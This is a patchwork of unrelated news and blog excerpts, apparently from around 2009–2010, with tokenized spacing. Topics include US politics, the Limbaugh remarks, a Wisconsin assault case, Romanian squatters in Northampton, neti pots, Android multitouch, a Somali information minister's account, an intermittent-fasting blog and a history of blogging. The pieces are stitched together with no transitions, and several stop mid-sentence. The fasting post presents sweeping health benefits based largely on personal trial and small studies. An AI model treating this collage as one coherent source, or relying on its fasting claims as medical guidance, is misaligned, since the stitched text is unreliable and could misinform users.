Now , it could be indigestion , which is minor , or it could be heart , which is n't minor .
So then ...
PAWLENTY : You have to do a little triage .
That 's for sure .
VAN SUSTEREN : Right .
I mean , so the problem is , it 's got -- I mean , there really is sort of -- it 's not that easy .
We love to complain about how Washington is broken , that it is too tied up in partisan politics and has forgotten how to actually govern .
And ironically , we also complain about Obama and the Democrats not standing up to the Republicans .
Or , in plainer words , we attack them for not being partisan enough .
And yet , governing is exactly what Obama is trying to do .
You can hear it in his announcement last week of an overhaul of the failed “ No Child Left Behind ” act in response to the report that the US is falling even further behind other countries in education .
You can also see it in the health care reform bill , which is likely to pass later today .
Yes , it is n’t the bill that some people on the left wanted , and goes way further than some people on the right wanted .
But it is reform , and it is at least a step in the right direction , which is a big step more than any president before him has been able to take .
I do n’t agree with everything that Obama does .
I do n’t like the bailouts of banks and auto companies .
I ’d prefer a single - payer health care system , modeled on the one in New Zealand , or at the very least a public option like in the bill sponsored by Alan Grayson .
And , occasionally , I want the Dems to be more partisan ; for example , I ’d love to see Dick Cheney rot in jail for war crimes .
But instead , Obama is trying to get this country back on track .
He ’s governing .
I may not like every little thing he does , but the important thing is that it is clear that he is working hard to do what he thinks is best for the country , not what is best for him getting reelected or for enriching his friends .
The process of governing might not get the headlines , but it is just what this country needs right now .
Romney 's tribute to Bush : Ended recession , ' took down '
Taliban
Mitt Romney offered an unusual tribute to George W. Bush in his speech today , making him one of the few speakers at CPAC to even mention the former president :
I am convinced that history will judge President Bush far more kindly — he pulled us from a deepening recession following the attack of 9 - 11 , he overcame teachers unions to test schoolchildren and evaluate schools , he took down the Taliban , waged a war against the jihadists and was not afraid to call it what it is — a war , and he kept us safe .
I respect his silence even in the face of the assaults on his record that come from this administration .
The passage had , I think , an audience of one : Bush .
Romney is looking to inherit what remains his network of establishment support in 2012 and to run the kind of dominant campaign Bush did that cycle .
But this is a difficult case to make .
One recession ended under Bush — but the recent , longer one began under Bush .
And if he " took down the Taliban , " what are American soldiers doing over there right now ?
CHILTON , Wis. —
A Wisconsin woman who tied up a cheating lover and glued his penis to his stomach said Tuesday that she did n’t mean to hurt him and only overreacted because he had tried to contact her 12 - year - old daughter .
Therese A. Ziemann , 48 , of Menasha , said she and three other women only meant to confront the married man about his cheating ways .
Her decision to grab the bottle of nail glue from her makeup bag was “ a stupid spur - of - the - minute decision , ” she said .
“ I had just found my daughter ’s number in his cell phone , ” she said outside a Calumet County courtroom .
“ It was just a warning from me to him , to stay away from the kids . ”
Ziemann , her sister , another lover and the man ’s wife were all sentenced Tuesday to one year probation plus community service for their roles in the revenge plot .
A judge also imposed and stayed jail sentences of 60 days for Ziemann and 30 days for the other three , meaning they would only serve the jail terms if they violate the conditions of their probation .
Ziemann , a mother of six , acknowledged that she lured the 37 - year - old man to a motel last July after the man ’s wife contacted her and told her he was seeing other women .
First she tied the man up and blindfolded him under the guise of erotic play .
Then she summoned the other three women with a text message , according to court documents .
She told police she slapped the man in the face , cut off his underwear and used the glue to attach his penis to his stomach .
The other three women arrived , and several berated and belittled the man .
Eventually he worked his way out of his restraints and the women fled .
The gluing caused the man “ no permanent physical injury , ” said Calumet County district attorney Ken Kratz .
The Associated Press is not naming the man or his wife to protect his identity as a victim of sexual assault .
All four women were charged with being party to the crime of felony false imprisonment .
Ziemann was also charged with misdemeanor counts of battery and fourth - degree sexual assault .
She reached a plea deal in which she pleaded no contest to battery and a reduced charge of disorderly conduct .
Her sister and the other lover also agreed to plead no contest to a lesser charge of misdemeanor disorderly conduct .
Michelle M. Belliveau , 43 , of Neenah , told the judge she was “ extremely sorry ” and apologized specifically to the victim .
“ We got caught up in something bad , ” she told him tearfully .
Belliveau is Ziemann ’s sister .
Wendy L. Sewell , 44 , also apologized , saying she did n’t mean for anyone to get hurt .
She said she only meant to confront the man by catching him in his cheating ways .
“ I wanted to say what I got to say and leave and never look back , ” said Sewell , of Kaukauna .
The felony charge against the wife was initially dismissed after the man told police she was in the motel room but did n’t actively participate .
But Kratz said he obtained jail telephone recordings made when the man was in custody on unrelated child - abuse charges .
In the tapes , the man and wife collaborated on “ concocting ” her story , he said .
So Kratz charged the 31 - year - old wife with disorderly conduct .
She pleaded no contest Tuesday and was also sentenced to probation and community service .
She declined to comment before sentencing .
The judge acknowledged a possible double - standard with the sentencing .
If the incident involved a man who committed similar acts against an unwilling woman , that man would doubtless face prison time , Judge Donald Poppy said .
But in this case the victim and his “ bad behavior ” were partly to blame , he said .
The victim “ started the ball rolling , philandering with others besides his wife , who was putting bread on the table and taking care of his children , ” the judge said .
After the sentencing the victim and his wife walked out of the courtroom together .
The man directed obscene gestures with each hand toward the handful of television cameras .
Outside the courthouse , as he got into an SUV with his wife , he told The Associated Press he felt bad for all four women .
He acknowledged that his own actions contributed to the situation , and he said he had no hard feelings toward any of them .
Married Donessa Davis ’s womanising ways came to a sticky end when he was lured to a hotel room by one of his lovers with the promise of an illicit romp .
His mistress Therese Ziemann tricked the 37 - year - old into the meeting after his wife told her that he was seeing two other women .
While Ziemann tied him up under the pretence of some erotic foreplay the other three women lay in wait .
The 48 - year - old mum - of - six then slapped Davis in the face , cut off his underwear and used nail glue to stick his member to his stomach .

Use feta and substitute oregano for the other herbs for a Greek flavor .
I used sourdough but I think this would also be nice with onion or brioche rolls as long as they are sturdy .
Any way you put these together , they will be great .

Fill - in - the - blank : " Four months ago , it appeared all but certain that the White House and Democrats in Congress would succeed in ___ . "
If you guessed " cutting off private student loan sharks from the federal trough , " you lose .
Sallie Mae wins !
The President wants to end the Federal Family Education Loan program .
In the FFELP , the government literally pays private lenders to rip off students .
This is called " the free market . "
Basically there is not a single coherent reason to oppose ending this program , unless you are actually on the Sallie Mae payroll ( like Senator Ben Nelson of Nebraska ) .
Ending the program would even save the government $ 80 billion over the next decade , according to the CBO , so of course " deficit hawks " ( like Senator Ben Nelson of Nebraska ! ) hate this plan .
Oh , and the House passed this thing last year .
It is stuck in this crazy other legislative body called " the Senate . "
Homeowner who forgot his wallet returns to find Romanian family moving in in scene from ' Dickensian times '
A householder returned home after forgetting his wallet - only to discover a Romanian family had moved in .
In what a judge described as a ' Dickensian ' spectacle , an immigrant couple with a child in tow had broken in through a window and were making themselves at home .
Mihai and Laura Dediu told the stunned homeowner they were moving into his two - bedroom house because they had heard it was empty , a court was told .
The homeowner is thought to have left the house for no more than an hour .
Forcing their way in : Mihai and Laura Dediu say they moved into the home after being told it had been empty for some time
Target :
The man , who lives alone in this two bedroom end - of - terrace house , was astounded to discover the Romanian family moving his belongings out
When he returned to collect the wallet he had forgotten , he found the couple inside and called the police .
The judge dealing with the case was incredulous at the details unfolded at Northampton Crown Court .
' The owner comes back at 5 pm and there 's an unknown car parked in his drive and the lights to the house are on , ' Judge Richard Bray told the court .
' He goes in and finds these two defendants and , wait for it , a young child .
We 're going back to Dickensian times , it appears .
' When challenged , the defendants say they own the property and are just moving in and that the male defendant was going to alter the locks as part of that process . '
Sentencing the Dedius to 100 hours ' community service with a 12 - month community order , he added : ' This is a bizarre case .
I must be the most experienced person in this building for burglary and in 26 years I cannot remember a case where burglars have taken a young child with them to carry out the burglary .
I really can't . '
Judge Richard Bray on the Romanian squatters : ' We are going back to Dickensian times it appears '
Dediu , 30 , and his 24 - year - old wife admitted criminal damage to windows and locks while forcing their way in to the house in Northampton on December 7 last year .
The pair said a Romanian man they met in a shop told them they could squat in the house because it was empty , the court heard .
Michael Waterfield , prosecuting , said : ' It may have been that 's what the defendants were told , but once they got into the house they would certainly have realised it was still occupied .
They were taking clothes from the cupboards . '
A burglary charge , which carries a maximum jail sentence of 14 years , was dropped because the pair claimed they never intended to steal .
They moved to Britain three years ago and rent a two - bedroom flat with daughters Rebecca , eight , and Denisa , two , half a mile from the £ 150,000 home they broke into .
Last night Dediu , a builder earning £ 8,000 a year , said : ' I met a man in the shop and he said this house was empty .
I was not earning much money and we were paying £ 450 a month rent .
I got into the house and started to tidy up .
It did not look as if anybody was living there .
' I want to work and pay my bills .
I do n't want free money .
I just wanted to save money and not pay rent . '
His wife said : ' The house was a mess .
We were tidying it up .
We did not think anybody was living there . '
The householder declined to comment or confirm his name when he returned from work yesterday .
The curtains remained drawn .
One neighbour said : ' I suppose someone could believe the house was empty . '

If you 're one of the millions of Americans dealing with sinus problems , you know how miserable facial pain and clogged nasal passages can be .
In their search for relief , many sinus sufferers have turned to nasal saline irrigation , a therapy that uses a salt and water solution to flush out the nasal passages .
Nasal Saline Irrigation and Neti Pots WebMD examines the use of Neti pots to help relieve sinus problems and allergy symptoms .

Although several methods of nasal irrigation exist , one of the most popular is the Neti pot -- a ceramic or plastic pot that looks like a cross between a small teapot and Aladdin 's magic lamp .
Although nasal irrigation using the Neti pot has been around for centuries , its use is on the rise in the U.S.
The Neti pot originally comes from the Ayurvedic / yoga medical tradition .
Does the Neti Pot Really Work ?
Some ear , nose , and throat surgeons recommend nasal irrigation with a Neti pot or other method for their patients who 've undergone sinus surgery , to clear away crusting in the nasal passages .
Many people with sinus symptoms from allergies and environmental irritants also have begun to regularly use the Neti pot or other nasal irrigation devices , claiming that these devices alleviate congestion , and facial pain and pressure .
Research backs up these claims , finding that nasal irrigation can be an effective way to relieve sinus symptoms when used along with standard sinus treatments .
For some people , nasal irrigation may bring relief of sinus symptoms without the use of medications .
On Thursday the Obama administration awarded $ 8 billion in stimulus funds to plan and build high - speed rail projects in California and Florida , and for other routine passenger - rail projects masquerading as high - speed rail .
This is a political plum to the states that will receive the money .

But this is not money well spent .
Supporters ...
In fact , all this talk about Android and multitouch just reminds me of the endless bickering about the iPhone and copy - and - paste before iPhone OS 3.0 came out : it did n't matter that the App Store was redefining mobile software sales or that the iPhone was turning into something much more than just a phone , because it lacked a single feature that everyone wanted .
Every conversation about the iPhone involved at least some bitching about copy - and - paste with a side order of moaning about MMS , and it still has n't completely subsided .
And now the exact same thing is happening with Android and multitouch , or " specific multitouch implementations , " or whatever Google wants to call it .
Pinchy - pinch .
Squeezy - weezy .
SuperTouch 3000 .
Guess what ?
It 's not in the platform by default , and everyone is constantly talking about it .
Actually , in some ways it 's even worse than the copy - and - paste situation , because the things we 've heard Google say about multitouch so far raise some troublesome questions .
For example , when we asked Erick why the European Motorola Milestone has pinch - to - zoom in the browser but the Droid does n't , he told us that " the software is n't in Google 's control " when it leaves the US .
So ... does that mean Google exerts control over Android in the US ?
How much control ?
Did it actively forbid Motorola from using pinch - to - zoom in the Droid 's browser ?
Why did n't Google use Motorola 's pinch - to - zoom code in the Droid , but use HTC 's code in the Droid Eris ?
And then not use it in the Nexus One ?
If Google does n't have any control over the Milestone , why does it allow Motorola to load Google apps like Gmail on it ?
Until someone can answer these questions in a reasonable way , they 're going to keep coming up over and over again .
Google prides itself on transparency and openness , and a secret deal forbidding Android from having pinch - to - zoom flies in the face of that culture .
Of course , there 's always a chance that Google and Apple really do have some backroom deal that prevents Android from having native pinch - to - zoom in the US -- Erick refused to explicitly deny such a deal when Josh asked him about " conspiracy theories " on the show .
But that 's a hard pill to swallow .
First , it puts
Google at a huge competitive disadvantage from the get - go , which is a terrible business strategy for a company that 's pretty damn good at running its business .
Second , Google prides itself on transparency and openness , and a secret deal forbidding Android from having pinch - to - zoom flies in the face of that culture .
You say it 's a patent issue ?
Nothing 's changed since the last time I walked that lonely road :
I still have yet to see an Apple patent that covers the pinch - to - zoom gesture , and Palm , Microsoft , and a laundry list of other companies are all now using the move without consequence .
Besides , it 's freaking Google -- the same company that up and decided copyright law was broken and started scanning out of print books because it wanted to try something new .
Even if there is some mythical Apple patent on pinch - to - zoom , Google is one of the few companies that has the financial and legal resources to get it invalidated -- and there 's plenty of prior art out there that 'll help it along the way .
Look , this is simple .
We love Android , and we want it to succeed .
But we can't move on to other , more important conversations -- just where is that full Unicode support ? -- until the distraction of the multitouch issue goes away .
That does n't mean Google has to code pinchy - pinch into Android 2.2 , and it does n't mean it has to retool the UI .
It just needs to tell its customers what 's really going on .
Updates : Limbaugh clarifies threat ; Directs racist ‘ Massa ’ quip at NY governor
For years , promises to leave the United States in the wake of an undesirable political development have been the domain of liberals .
Celebrities such as Alec Baldwin , Sean Penn and Susan Sarandon all at some point suggested they would move to Canada if a Republican won the White House .
ADVERTISEMENT
( There ’s even a Facebook group around to motivate them , complete with a helpful link to Canada ’s department of citizenship and immigration . )
While most of those were empty threats , there are notable exceptions : Film director Robert Altman moved to France after George W. Bush ’s victory in 2000 ; Law & Order star Michael Moriarty shipped off to Canada well before that .
But now the decidedly non-liberal Rush Limbaugh has made a similar move , telling his audience he will move to Costa Rica if health care reform becomes law .
And now the only question that remains is whether Limbaugh will make good on his word , or join the ranks of the empty - promisers .
“ If the health care bill passes , where would you go for health care yourself ? ” a caller asked Limbaugh on his radio show Tuesday .
“ I ’ll just tell you this , if this passes and it ’s five years from now and all that stuff gets implemented — I am leaving the country .
I ’ll go to Costa Rica , ” Limbaugh replied .

Limbaugh clarifies threat ; Directs racist ‘ Massa ’ quip at NY governor

Limbaugh clarified his threat .
Right - wing radio talker Rush Limbaugh must be confused .
During a recent broadcast , he vowed to “ go to Costa Rica ” if President Obama is successful in passing his health reform legislation .
Most assumed he meant the statement in the vein of his promise to leave New York City over its tax rates , which he did .
Now Limbaugh is saying he will not leave the U.S. , as in , move away .
Instead , Limbaugh claims that he will simply “ go to Costa Rica ” for his medical care .
Interestingly enough , even as the Republican icon has made many a dollar damning proposals for public health care in the United States , his future hospital bed in Costa Rica will be watched over by the same “ socialists ” he ’s so known for deriding .
Costa Rica , you see , has socialized health care operated by a government insurance monopoly , which provides a remarkably high quality of service for a fraction of the costs routinely seen in the United States .

Limbaugh is getting blasted for saying something that many critics believe might be the most racist thing he has ever said yet .
Huffington
Post notes , “ Discussing the resignation of Rep. Eric Massa and the possibility that Paterson would appoint his replacement or call a special election , Limbaugh invoked Massa ’s last name in a reference to slavemasters , also known as “ massas . ”
“ I am reasonably sure that Paterson will be appointing the replacement , assuming that he , you know , does n’t resign in the next 60 or 90 days , ” a caller said to Limbaugh .
“ Let ’s assume you ’re right , ” Limbaugh responded .
“ So , David Paterson will become the massa … who gets to appoint whoever gets to take Massa ’s place .
So , for the first time in his life , Paterson ’s gonna be a massa .
Interesting , interesting . ”

One blogger complains , “ If this level of racism , by a minority radio commentator , was directed at white people there is no way in the world he would still be broadcasting .
No way period !
I do n’t care what people say about the Rev. Jeremiah Wright .
I do n’t care what videos of Louis Farrakhan that Fox News drags out and airs every hour on the hour .
If America was really post - racial then this fool would not have an audience . ”

Life Inside Somalia ’s Bunker Government
Just after I was sworn in as a minister in Somalia ’s government last August , I took a tour of my new office , located at the heart of the turbulent capital , Mogadishu .
I had been there before — though only for a glimpse .
This time , as I walked through the halls and ventured into the rooms , I saw what I was really in for :
There were no telephones , no fax equipment , no Internet access , and the radios were n’t working .
And I was the new minister of information .
In Somalia , to be minister of information is to lead a war — a war of ideas — against the Islamist militias tearing the country apart .
On one side , you have al - Shabab and its affiliates , linked with al Qaeda .
On the other side , you have the Somali Information Ministry and the government , trying to communicate with Somali people .
That was our job , but we lacked even the most basic equipment to do it .
My first days of work as a cabinet minister were spent buying tools — a transmitter for the radio and other equipment for my office .
I had to find generators for electricity .
We had to start everything from ground zero on everything , lacking in financial resources as well .
Then I had to find journalists from Mogadishu ’s shrinking media to add to our staff .
We started with only 30 , but today we have about 100 , and we have managed to be online almost 18 hours a day .
Our radio station , Radio Mogadishu , has a website .
It is broadcast in Somalia daily by satellite .
By now , my daily work has moved on from finding transmitters and phones , but I still spend much of my time watching over the security of the ministry ’s staff .
Our most important job these days is to cure the Somali people of the idea that Shabab and al Qaeda are a future for Somalia .
We have to help people understand that Shabab ’s agenda is not in their interest .
We have a variety of programs : cultural , sport , or programs led by religious scholars who explain how Shabab has nothing to do with Islam .
Traditional leaders have spoken on the air .
We support the forces fighting against Shabab in central regions by helping them to communicate with the country .
A good example of our work was aired at the end of December : a program called the " Destiny of Shabab . "
Radio Mogadishu outlined the differences between different groups within Shabab — those who are led by foreign elements and those who are led by more nationalistic and local leaders .
We can tell that our listeners listened in great numbers to that program because after it aired , Shabab outlawed Radio Mogadishu and prohibited listening to it in the territories that they control .
The result of that banning , however , was not what Shabab expected :
We have seen an increase in listeners since the program .
Our answer to their ban was to broadcast Radio Mogadishu via satellite .
Now , for the first time , we feel that we have the upper hand against Shabab when it comes to the communication war .
We have exposed their nature ; we have exposed their wrong ideas and twisted ideology .
Shabab has a radical agenda :
They are against the Somali flag and do n’t recognize the borders of Somalia .
They say they are planning to send support , in the form of fighters , to nearby Yemen .
We have explained this to the Somali people , and Shabab is feeling the heat .
Of course , they are still stronger when it comes to the military , but when it comes to the core ideas , we are starting to make inroads .
It is very important that this government win the hearts and minds of the Somali people .
This does put us at risk , but our lives — the lives of the journalists working at Radio Mogadishu — are similar to the lives of the Somali people : constantly under threat .
We do believe we are perhaps more endangered ; there are elements within Shabab and another Islamist militia , Hizbul al - Islam , that want to silence us and the voice of Radio Mogadishu .
Our reporters and producers have received calls from Shabab , saying " We will kill you — you are No. 1 on our list . "
We record those calls when they come into our studios so that we have a record of the threats as evidence .
Security is why everyone from Radio Mogadishu must live in a compound inside the ministry , where they are a bit safer .
Life takes place at the ministry — family life , work , everything .
The women and men have different compounds where they live .
Life for other journalists is also incredibly difficult .
They too face many death threats .
As a former owner of a Quranic radio station , I have witnessed this firsthand and I continue to have good relations with the independent media .
Today , there are about 13 radio and TV outlets in Mogadishu .
When I recently met with some of these media organizations , I asked them why their reporting often seemed biased against the government .
They replied , " Of course , we know that we are not reporting on some issues very neutrally .
But our lives are being threatened by al - Shabab .
When we start our work in the morning , someone from al - Shabab is always waiting at the entrance to the office .
If we try to tell the truth , or say something that runs against al - Shabab , then we know we will be killed .
Some of our friends have lost their lives because of that .
This is why we ca n’t always tell the truth and why we have some biased reporting . "
Journalists today in Somalia have lost all freedom of expression .
That ’s why we , as an information ministry , have redoubled our effort and established Radio Mogadishu .
We have vowed to report on everything — even if there is a wrongdoing on the government side .
For the entire Somali cabinet , life is a daily struggle .
Our basic approach is to do what we can .
We start from the question of what we can accomplish with our very , very small resources .
I know everyone as a human being would like to live longer and live in a peaceful area .
But sometimes in life , you have no choice .
You have to make sacrifices — because of religion or because of the nation ’s interest .
In our situation , we are there every day because of the nation ’s interest , because of the challenges that we are facing .
I remember when three of our ministers died in a Dec. 3 , 2009 , suicide attack .
It killed students and doctors attending a graduation ceremony as well .
I remember having a cabinet meeting right after and making a common promise to ask each other that we have to be strong and we have to be committed for the long haul — re-establishing peace in Somalia .
All of us ministers made that commitment .
We have no choice but to stay and fight , even if we have to die for it .
How would you like it if I told you there was a way to eat pretty much anything and everything you wanted to eat and still maintain your health ?
Or better yet , what if I told you that you could eat pretty much anything and everything you wanted and even improve your health ?
Would you be interested ?
I figured as much .
There is a way to reduce blood sugar , improve insulin sensitivity , reduce blood pressure , increase HDL levels , get rid of diabetes , live a lot longer , and still be able to lose a little weight .
All without giving up the foods you love .
And without having to eat those foods in tiny amounts .
Sounds like a late - night infomercial gimmick , but it is n’t .
Before I get to the real nitty gritty of how such a thing can be done , let ’s look at a method that has been proven in countless research institutions to bring about all the above - mentioned good things .
It ’s called caloric restriction .
When researchers restrict the caloric intake of a group of lab animals to about 30 to 40 percent of that of their ad libitum ( all they want to eat ) fed counterparts , they find that the calorically restricted animals live 30 percent or so longer , do n’t develop cancers , diabetes , heart disease , or obesity .
These calorically restricted ( CR ) animals have low blood sugar levels , low insulin levels , good insulin sensitivity , low blood pressure and are , in general , much healthier than the ad lib fed animals .
Most of the work in caloric restriction has been done on rodents , but there is a long term study on Rhesus monkeys ( 17 years at this point ) that appears to confirm the rodent data on longevity and health with CR in primates .
There are no human longevity studies , but there are a number of human studies on CR and health that show that human subjects under CR conditions reduce blood sugar , improve insulin sensitivity , reduce blood pressure , etc. , so it stands to reason that if humans reduced their caloric intake by 30 - 40 percent for their entire lives , they would also live longer .
Caloric restriction is a terrific way to lose weight and get healthy ; problem is , it ’s not much fun .
When rats live out their little ratty lives calorically restricted in their cages they seem to show signs of depression and irritability .
Primates do for sure .
If primates do n’t get enough cholesterol , they can actually become violent .
But , if you ’re willing to put up with a little irritability , hostility and depression , it might be worth cutting your calories by 30 percent for the rest of your long , healthy miserable life .
Does n’t sound so cheery ?
You ’re not ready to sign up yet ?
Well , there is a better way .
A number of different research teams have studied a method by which rodents can get all the health and longevity benefits of caloric restriction without calorically restricting .
And the method has been studied in humans and seems to achieve the same health benefits and , if an old Spanish study can be believed , maybe even an increase in lifespan .
What is this magic method ?
Intermittent fasting .
In regular fasting one goes entirely without food , which is caloric restriction carried to the extreme .
Going entirely without food in the short term leads to improvement in health , but also leads to an extremely short life unless the fast is aborted .
Intermittent fasting ( IF ) is just as its name implies : a period of fasting alternated with a period of eating .
But is n’t that what we do anyway ?
We eat breakfast , then fast until lunch .
Then , after lunch , we fast until supper .
Then we fast all night .
Uh , not exactly .
In research settings animals that are intermittently fasted are fed every other day , so they eat whatever they want for a day , then they are denied food for a day .
Interestingly , on feeding days most of the animals eat a almost double the amount that their ad lib fed mates do .
Thus the IF animals eat about the same number of calories overall that the ad lib fed animals eat , but , and this is a huge ‘ but , ’ the IF animals enjoy all the health advantages that the CR animals do , and , in fact , are even healthier than the CR animals .
Like caloric restriction , intermittent fasting reduces oxidative stress , makes the animals more resistant to acute stress in general , reduces blood pressure , reduces blood sugar , improves insulin sensitivity , reduces the incidence of cancer , diabetes , and heart disease , and improves cognitive ability .
But IF does even more .
Animals that are intermittently fasted greatly increase the amount of brain - derived neurotrophic factor ( BDNF ) relative to CR animals .
CR animals do n’t produce much more BDNF than do ad libitum fed animals .
What ’s BDNF ?
( The Wikipedia definition is actually pretty good )
BDNF , as its name implies , is a substance that increases the growth of new nerve cells in the brain , but it does much more than that .
BDNF is neuroprotective against stress and toxic insults to the brain and is somehow–no one yet knows how , exactly –involved in the insulin sensitivity / glucose regulating mechanism .
Infusing BDNF into animals increases their insulin sensitivity and makes them lose weight .
Humans with greater levels of BDNF have lower levels of depression .
BDNF given to depressed humans reduces their depression .
And Increased levels of BDNF improves cognitive ability .
In short , you want as much BDNF as you can get . , and with IF you can get a lot .
But , who wants to go all day every other day without food ?
Well , you do n’t have to .
MD and I , using ourselves ( selflessly , I might add ) as subjects have worked it out .
Most rodents feed throughout the day and night , so restricting them for 24 hours does just that : it restricts them for 24 hours .
In humans , however , the situation is different .
We humans , for the most part , eat only during our waking hours .
So if we fast for a day , we end up fasting for about 34 hours and eating for 14 , which is n’t the same as 24 on , 24 off .
Let me show you what I mean .
Let ’s say you pick a day to start .
You eat all day , then go to bed , wake up in the morning and fast all day , then go to bed .
You wake up the next morning and eat all day , then go to bed and start again .
So , assuming you eat until 10 PM on your eat day , once you quit eating you do n’t eat again until 8 AM 34 hours later .
If you eat from 8 AM that day until 10 PM , you ’ve eaten for 14 hours .
so , you ’re on ( eating ) for 14 hours and off ( fasting ) for 34 .
MD and I spent a couple of weeks doing it that way , and I ’m here to tell you , it ’s no fun .
At least not on the fast days .
The eating days were a different story ; they were great , but we would spend the entire day dreading the fast day coming up .
We fooled around with a number of different eat - fast - eat regimens and came up with something that works pretty well .
We set up our cutoff time as 6 PM .
On the day we started , we ate until 6 PM , then fasted until 6 PM the next day .
On the next day we ate supper right after 6 PM and ate breakfast and lunch ( and a few snacks ) the next day until 6 PM when we started fasting again .
The advantage of this regimen is that we were able to eat every day .
One day we would get supper –the next day we would get breakfast and lunch .
On no days would we go entirely without food .
This schedule worked the best for us .
On the times during the day that we ate , we did n’t stick with our normal low - carb fare ; we ate pretty much whatever we wanted , including a fare amount of higher carb stuff .
We stuck with the regimen for a few weeks just to see if we could tolerated it , which we did just fine .
We ultimately drifted back to our normal low - carb diet , however , just because it seemed to work better with our schedules .
We could have been happy on the intermittent fasting regimen for the long term .
I would think that the optimal way to go would be to follow an intermittent fast using low - carb foods during the eating periods .
One would get the best of all worlds healthwise this way .
Over the period that we followed the various IF regimens we lost a little weight because , unlike the rodents , we could n’t eat twice as much during the eating days as we would have eaten were we not fasting .
We did n’t check any lab work to see if any values had changed .
We were n’t doing a hard core study ; we were simply evaluating IF as a practical means for humans to use to improve their health .
In thinking about the process I came to the conclusion that IF was probably the way Paleolithic man ate .
We modern humans have become acculturated to the three square meals per day regimen .
Animals in the wild , particularly carnivorous animals , do n’t eat thrice per day ; they eat when they make a kill .
I would imagine that Paleolithic man did the same .
If I had to make an intelligent guess , I would say that Paleolithic man probably ate once per day or maybe even twice every three days .
In data gathered from humans still living in non-Westernized cultures in the last century , it appears that they would gorge after a kill and sleep and lay around doing not much of anything for the next day or so .
When these folks got hungry , they went out and hunted and started the cycle again .
If you buy into the idea that the Paleolithic diet is the optimal diet for us today because it is the diet we were molded by the forces of natural selection to perform best on , then you should probably also buy into the idea that a meal timing schedule more like that of Paleolithic mean would provide benefit as well .
One of the things MD and I took away from our IF experience is the idea that we do n’t have to eat three meals per day .
We now often skip lunch and do n’t seem any the worse for it .
Sometimes we get up and get going with all our projects and do n’t eat breakfast .
We try to skip a meal here and there because figure it ’s probably good for us .
When you get used to it , you do n’t really even think about it .
And it ’s good for you .
Do n’t take my word for it –look at the medical literature .
There have been a few human studies on IF , and all have shown a marked improvement in virtually every parameter tested .
None of the subjects in any of these studies has done the full 24 on - 24 off that MD and I did .
Most fasted until 5 or 6 PM on the fast days , then ate , then ate regularly on the eat days .
Even with this wimpy IF schedule the subjects did better .
One of the recent papers published on the less rigid IF schedules caught my eye because one of the authors was Don Laub , who used to be the chairman of the plastic surgery department at Stanford .
When I was in medical school I thought I wanted to be a plastic surgeon so I went to Stanford during a part of my senior year and worked with Dr. Laub as my mentor .
In this study , published in the journal Medical Hypothesis in March of this year , Dr. Laub along with two other physicians ( neither of whom I know ) underwent their version of and intermittent fast .
The three of them have since May 2003 been on a version of the IF in which they consume about 20 - 50 percent of their estimated daily energy requirements on the fast day and eat whatever they want on the non-fast days .
Since starting their regimen they have
observed health benefits starting in as little as two weeks , in insulin resistance , asthma , seasonal allergies , infectious diseases of viral , bacterial and fungal origin ( viral URI , recurrent bacterial tonsillitis , chronic sinusitis , periodontal disease ) , autoimmune disorder ( rheumatoid arthritis ) , osteoarthritis , symptoms due to CNS inflammatory lesions ( Tourette ’s , Meniere ’s ) cardiac arrhythmias ( PVCs , atrial fibrillation ) , menopause related hot flashes .
In their paper these researchers discuss a 1957 paper from the Spanish medical literature .
… the subjects were eating , on alternate days , either 900 calories or 2300 calories , averaging 1600 , and that body weight was maintained .
Thus they consumed either 56 % or 144 % of daily caloric requirement .
The subjects were in a residence for old people , and all were in perfect health and over 65 .
Over three years , there were 6 deaths among 60 study subjects and 13 deaths among 60 ad lib - fed controls , non-significant difference .
Study subjects were in hospital 123 days , controls 219 , highly significant difference .
We believe widespread use of this pattern of eating could impact influenza epidemics and other communicable diseases by improving resistance to infection .
In addition to the health effects , this pattern of eating has proven to be a good method of weight control , and we are continuing to study the process in conjunction with the NIH .
There is much more to the IF story that I will continue in another post .
I would do it in this one , but I ( actually my web guy ) upgraded my blogging software and somehow the little buttons that let me link to other sites are AWOL .
I ca n’t italicize or set off quotes or do any of the things I normally do in the course of posting .
I ’m hoping that I will get this straightened out soon .
When I do , I ’ll go into the subject in a little more detail and show a chart that demonstrates the difference between CR and IF .
( Note : the problem is solved ; all links are working . )
In the meantime , if any of the readers of this blog would like to undertake an intermittent fast , I would love to hear the results of the experience .
Please send a comment .

MARJAH , Afghanistan — U.S. and Afghan troops invaded this Taliban - held town early Saturday , launching the main thrust of the largest coalition offensive since 2001 , a test of whether America 's surge strategy can rescue the faltering war effort .
British , Afghan and U.S. troops were poised to begin an even larger thrust to take over one of the last Taliban - controlled bastions in the volatile Helmand River Valley .
The offensive in Marjah began with small teams dropping into the town around midnight to kill or capture insurgent ...

Blogging brings out the hit - and - run element in communication .
Bloggers tend to be punchy .
They often hit below the belt ; and when they land a blow , they dash off to another target .
Pow !
The idea is to provoke , to score points , to vent opinions , and frequently to gossip .
The most gossipy blogs take aim at public figures , combining two basic ingredients , scurrility and celebrity , and they deal in short jabs , usually nothing longer than a paragraph .
They often appeal to particular constituencies such as Hollywood buffs ( Perez Hilton ) , political junkies ( Wonkette ) , college kids ( IvyGate ) , and lawyers ( Underneath Their Robes ) .
Politically they may lean to the right ( Michelle Malkin ) or to the left ( Daily Kos ) .
But all of them conform to a formula derived from old - fashioned tabloid journalism : names make news .
How new , then , is bloggery ?
Should we think of it as a by - product of the modern means of communication and a sign of a time when newspapers seem doomed to obsolescence ?
It makes the most of technical innovations — the possibility of constant contact with virtual communities by means of web sites and the premium placed on brevity by platforms such as Twitter with its limit of 140 characters per message .
Yet blog - like messaging can be found in many times and places long before the Internet .
Here , for example , is a recent post on The Superficial :
RadarOnline reports “ traditional marriage ” crusader and former Miss California Carrie Prejean is living in sin with her fiancé Kyle Boller of the St. Louis Rams where they ’re no doubt eating shellfish .
BURN THEM !
And here is a typical entry from Le Gazetier cuirassé ou anecdotes scandaleuses de la cour de France ( 1771 ) :
Mlle .
Romans is soon to marry M. de Croismare , Governor of the Ecole Militaire , who will use six aides de camp to take his place in performing the conjugal service .
Short , scurrilous abuse proliferated in all sorts of communication systems : taunts scribbled on palazzi during the feuds of Renaissance Italy , ritual insult known as “ playing the dozens ” among African Americans , posters carried in demonstrations against despotic regimes , and graffiti on many occasions such as the uprising in Paris of May–June 1968 ( one read “ Voici la maison d’un affreux petit bourgeois ” ) .
When expertly mixed , provocation and pithiness could be dynamite — the verbal or written equivalent of Molotov cocktails .
This subject deserves more study , because for all of their explosiveness , the blog - like elements in earlier eras of communication tend to be ignored by sociologists , political scientists , and historians who concentrate on full - scale texts and formal discourse .
